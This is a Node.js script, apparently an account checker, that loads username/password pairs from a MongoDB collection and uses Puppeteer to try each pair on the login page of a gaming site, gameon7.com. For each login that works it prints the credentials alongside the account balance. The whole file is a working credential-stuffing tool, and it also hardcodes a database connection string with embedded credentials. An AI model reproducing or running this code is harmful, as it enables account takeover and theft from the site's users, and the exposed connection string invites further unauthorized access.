const puppeteer = require('puppeteer');
const mongoose = require('mongoose')


let mongoURI = 'mongodb+srv://saif:saif@cluster0.szwmr.mongodb.net/gameonacc?retryWrites=true&w=majority';
// DB Connection

mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  useFindAndModify: false
}).then(()=> {
  console.log('database connected')
}).catch(error => console.log('something went wrong'))



const accounts = mongoose.Schema({
  username: { type: String},
  password: { type: String }
});

let Account = mongoose.model('Accounts', accounts)


async function main(){
  
  	  const browser = await puppeteer.launch({headless: false});
	  const page = await browser.newPage();
	  await page.goto('https://gameon7.com/userlogin', {waitUntil: 'networkidle2'});
	  let accounts = await Account.find({}).lean()
	
	  for(let i=0; i< accounts.length; i++){
	  	let username = accounts[i].username
	  	let newPass = accounts[i].password.split("\r\n")
	  	let password = newPass[0]
	  	
		  // check accounts
		await page.reload()
		await page.type('input[name=username]', username)
		await page.type('input[name=password]', password)
		await page.click('.btn-primary')

		await page.waitForTimeout(2000)


		let alert = await page.evaluate(() => {
			let el = document.querySelector(".alert")
			return el ? el.innerText : ""
		  })

		if(alert.includes("Invalid")){
			console.log({
				username,
				password,
				msg:'incorrect'
			})
		}else{
				await page.waitForTimeout(3000)
				await page.waitForSelector(".ml-auto")
				await page.click(".ml-auto")
				const element = await page.$("#user_balance");
	    		const text = await page.evaluate(element => element.textContent, element);
	    		
				console.log({
					username:username,
					password:password,
					balance:text
				})

				await page.click('#topNavbar > ul.navbar-nav.ml-auto > li > div > div > div > div > a:nth-child(6)')
				await page.waitForTimeout(2000)
		}
		  
	  }
	  
  
};


main()
